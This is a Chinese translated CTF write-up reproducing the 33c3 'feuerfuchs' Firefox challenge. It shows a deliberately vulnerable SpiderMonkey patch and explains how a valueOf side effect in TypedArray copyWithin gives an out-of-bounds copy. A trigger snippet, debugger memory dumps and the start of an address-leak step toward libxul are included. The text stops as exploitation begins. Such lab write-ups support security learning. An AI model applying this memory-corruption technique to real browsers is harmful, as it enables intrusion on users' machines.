# firefox pwn 入门 - 33c3 feuerfuchs 复现
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
学习firefox上的漏洞利用, 找了`33c3ctf` saelo 出的一道题目`feuerfuchs`, 这里记录一下学习的过程， 比较基础。
## 环境搭建
firefox
版本为[`50.1.0`](https://ftp.mozilla.org/pub/firefox/releases/50.1.0/source/firefox-50.1.0.source.tar.xz),版本比较老了，在`ubuntu
1604` 下编译不会出现问题，先把源码下载下来, 题目文件在[这里](https://github.com/saelo/feuerfuchs) 下载
进入源码目录，打上patch之后编译即可,
    // patch
    root@prbv:~/firefox-50.1.0# patch -p1  tarr, uint32_t newLength) {
    +        if (newLength > tarr->length()) {
    +            // Ensure the underlying buffer is large enough
    +            ensureHasBuffer(cx, tarr);
    +            ArrayBufferObjectMaybeShared* buffer = tarr->bufferEither();
                // 检查是否越界
    +            if (tarr->byteOffset() + newLength * tarr->bytesPerElement() > buffer->byteLength())
    +                return false;
    +        }
    +
    +        tarr->setFixedSlot(LENGTH_SLOT, Int32Value(newLength));
    +        return true;
    +    }
`offsetGetter` 就是返回`offset` 这个属性而已, `offsetSetter` 传入一个 `newOffset` ,
TypeArray 整体`offset + length` 为实际分配的内存大小， 如`a=new Uint8Array(new
ArrayBuffer(0x60))` 这样初始化后`offset ==0; length == 0x60`, 然后假如`a.offset =
0x58`执行后，就会有`offset == 0x58; length == 0x8，` offset 为当前读写的指针， 类似文件的`lseek`
    diff --git a/js/src/vm/TypedArrayObject.h b/js/src/vm/TypedArrayObject.h
    index 6ac951a..3ae8934 100644
    --- a/js/src/vm/TypedArrayObject.h
    +++ b/js/src/vm/TypedArrayObject.h
    @@ -135,12 +135,44 @@ class TypedArrayObject : public NativeObject
             MOZ_ASSERT(v.toInt32() >= 0);
             return v;
         }
    +    static Value offsetValue(TypedArrayObject* tarr) {
    +        return Int32Value(tarr->getFixedSlot(BYTEOFFSET_SLOT).toInt32() / tarr->bytesPerElement());
    +    }
    +    static bool offsetSetter(JSContext* cx, Handle tarr, uint32_t newOffset) {
    +        // Ensure that the new offset does not extend beyond the current bounds
            // 越界检查
    +        if (newOffset > tarr->offset() + tarr->length())
    +            return false;
    +
    +        int32_t diff = newOffset - tarr->offset();
    +
    +        ensureHasBuffer(cx, tarr);
    +        uint8_t* ptr = static_cast(tarr->viewDataEither_());
    +
    +        tarr->setFixedSlot(LENGTH_SLOT, Int32Value(tarr->length() - diff));
    +        tarr->setFixedSlot(BYTEOFFSET_SLOT, Int32Value(newOffset * tarr->bytesPerElement()));
    +        tarr->setPrivate(ptr + diff * tarr->bytesPerElement());
    +
    +        return true;
    +    }
到这里没有什么问题， 但是这里`offsetSetter` 没有考虑到`side-effect`的情况
###  漏洞分析
在`js/src/builtin/TypedArray.js` 里可以找到`TypeArray` 绑定的一些函数,
主要看`TypedArrayCopyWithin` 函数，它会在`a.copyWithin(to, from, end)` 的时候调用,
作用是把`from` 到`end` 的项拷贝到`to` 开始的地方，像下面，`'c'， 'd'` 被拷贝到了 `index == 0` 处
    js> a=['a','b','c','d','e']    
    ["a", "b", "c", "d", "e"]      
    js> a.copyWithin(0,2,3)        
    ["c", "b", "c", "d", "e"]      
    js> a.copyWithin(0,2,4)        
    ["c", "d", "c", "d", "e"]
这里假设还是`a=new Uint8Array(new ArrayBuffer(0x60))` , 执行`a.copyWithin(0,
0x20,0x28)`
    function TypedArrayCopyWithin(target, start, end = undefined) {
        // This function is not generic.
        if (!IsObject(this) || !IsTypedArray(this)) {
            return callFunction(CallTypedArrayMethodIfWrapped, this, target, start, end,
                                "TypedArrayCopyWithin");
        }
        GetAttachedArrayBuffer(this);
        var obj = this;
        // len == 0x60
        var len = TypedArrayLength(obj);
        var relativeTarget = ToInteger(target);
        // to == 0
        var to = relativeTarget  0)
            MoveTypedArrayElements(obj, to | 0, from | 0, count | 0);
        // Step 18.
        return obj;
    }
这里首先获取了`len == 0x60` , 然后用`ToInteger` 分别获取`start` 和 `end` 的值，这里其实就和saelo发现的jsc
`cve-2016-4622` 差不多，先获取了len, 但是在`ToInteger` 里面`len` 可能会被更改，加入运行下面代码
    a.copyWithin({ 
        valueOf: function() { 
            a.offset = 0x58 ; 
            return 0x0; 
        } }, 0x20, 0x28);
计算`to` 的时候`ToInteger(target);` 会先执行`ValueOf` 的代码， 完了`offset == 0x58 ; length
== 0x8`, 后续的`MoveTypedArrayElements` 的读写会从`a[0x58]` 开始， 于是就有了越界。
测试一下
    // 创建两个 ArrayBuffer， 他们内存布局上会相邻
    js> a=new ArrayBuffer(0x60);
    js> b=new ArrayBuffer(0x60);
    js> dumpObject(a)
    object 0x7ffff7e85100 from global 0x7ffff7e85060 [global]
    //...
    js> dumpObject(b)
    object 0x7ffff7e851a0 from global 0x7ffff7e85060 [global]
    //...........................
    pwndbg> x/40gx 0x7ffff7e85100
    // a
    0x7ffff7e85100: 0x00007ffff7e82880      0x00007ffff7ea9240
    0x7ffff7e85110: 0x0000000000000000      0x000055555660c2e0
    0x7ffff7e85120: 0x00003ffffbf428a0      0xfff8800000000060
    0x7ffff7e85130: 0xfffc000000000000      0xfff8800000000000
    0x7ffff7e85140: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85150: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85160: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85170: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85180: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85190: 0x0000000000000000      0x0000000000000000
    // b
    0x7ffff7e851a0: 0x00007ffff7e82880      0x00007ffff7ea9240
    0x7ffff7e851b0: 0x0000000000000000      0x000055555660c2e0
    0x7ffff7e851c0: 0x00003ffffbf428f0      0xfff8800000000060
    0x7ffff7e851d0: 0xfffc000000000000      0xfff8800000000000
    0x7ffff7e851e0: 0x0000000000000000      0x0000000000000000
    0x7ffff7e851f0: 0x0000000000000000      0x0000000000000000
    js> test = new Uint8Array(a)                                                    
    js> hax = {valueOf: function(){test.offset = 0x58; return 0;}}
    js> test.copyWithin(hax,0x20,0x28)                                                              
    // 执行之后
    pwndbg> x/40gx 0x7ffff7e85100
    // a
    0x7ffff7e85100: 0x00007ffff7e82880      0x00007ffff7ea9240
    0x7ffff7e85110: 0x0000000000000000      0x000055555660c2e0
    0x7ffff7e85120: 0x00003ffffbf428a0      0xfff8800000000060
    0x7ffff7e85130: 0xfffe7ffff3d003a0      0xfff8800000000000
    0x7ffff7e85140: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85150: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85160: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85170: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85180: 0x0000000000000000      0x0000000000000000
                    // offset == 0x58
    0x7ffff7e85190: 0x0000000000000000      0x000055555660c2e0//<==
    // b
    0x7ffff7e851a0: 0x00007ffff7e82880      0x00007ffff7ea9240
    0x7ffff7e851b0: 0x0000000000000000      0x000055555660c2e0//<===
    0x7ffff7e851c0: 0x00003ffffbf428f0      0xfff8800000000060
    0x7ffff7e851d0: 0xfffc000000000000      0xfff8800000000000
    0x7ffff7e851e0: 0x0000000000000000      0x0000000000000000
    0x7ffff7e851f0: 0x0000000000000000      0x0000000000000000
    0x7ffff7e85200: 0x0000000000000000      0x0000000000000000
可以看到 `b` 的 `0x000055555660c2e0` 被拷贝到了`a` 的内联数据里，这样就可以用`a` 获取 `ArrayBuffer b`
中的内存地址
## 漏洞利用
###  地址泄露
通过前面分析我们了解了漏洞的基本成因和效果，接下来就是这么利用了， 前面我们可以通过`copyWithIn` 来泄露`ArrayBuffer b` 的地址,
我们需要泄露出`0x000055555660c2e0` ， 和`0x00003ffffbf428f0` 这两个地址.
`0x000055555660c2e0` 在 jsshell 中指向js 的`emptyElementsHeaderShared`, 在完整的firefox
里指向 `libxul.so` ， 通过这个地址就可以泄露出 `libxul.so` 的地址。
`0x00003ffffbf428f0 <<1 == 0x7ffff7e851e0` 指向申请的buffer, 因为这里申请的是`0x60`